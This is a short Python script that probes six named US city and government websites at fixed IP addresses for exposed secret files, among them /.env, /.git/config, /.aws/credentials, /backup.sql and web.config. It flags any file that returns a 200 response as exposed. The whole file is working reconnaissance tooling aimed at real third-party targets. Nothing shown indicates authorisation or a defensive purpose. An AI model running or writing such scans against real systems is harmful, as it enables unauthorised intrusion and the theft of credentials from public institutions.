import socket, time

def check(ip, host, ep, port=80):
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect((ip, port))
        req = 'GET ' + ep + ' HTTP/1.1\r\nHost: ' + host + '\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n'
        s.send(req.encode())
        resp = s.recv(2048).decode('latin-1', errors='replace')
        code = resp.split('\r\n')[0]
        s.close()
        return code
    except:
        return 'TIMEOUT'

targets = [
    ('acworth.org', '213.165.236.104'),
    ('ardmorecity.org', '208.90.191.118'),
    ('suffolkva.us', '166.62.42.178'),
    ('wichita.gov', '8.14.206.137'),
    ('stpaul.gov', '54.165.146.83'),
    ('columbus.gov', '52.247.170.120'),
]

eps = ['/.env', '/.git/config', '/.aws/credentials', '/.aws/config', '/backup.sql', '/.config/db.yml', '/robots.txt', '/web.config']

for name, ip in targets:
    print('\n=== ' + name + ' (' + ip + ') ===')
    for ep in eps:
        code = check(ip, name, ep)
        if '200' in code:
            print('  ' + ep + ' -> ' + code + ' *** EXPOSED ***')
        elif '301' not in code and '302' not in code and '404' not in code and '403' not in code and 'TIMEOUT' not in code:
            print('  ' + ep + ' -> ' + code)
        time.sleep(0.15)

print('\n[DONE]')
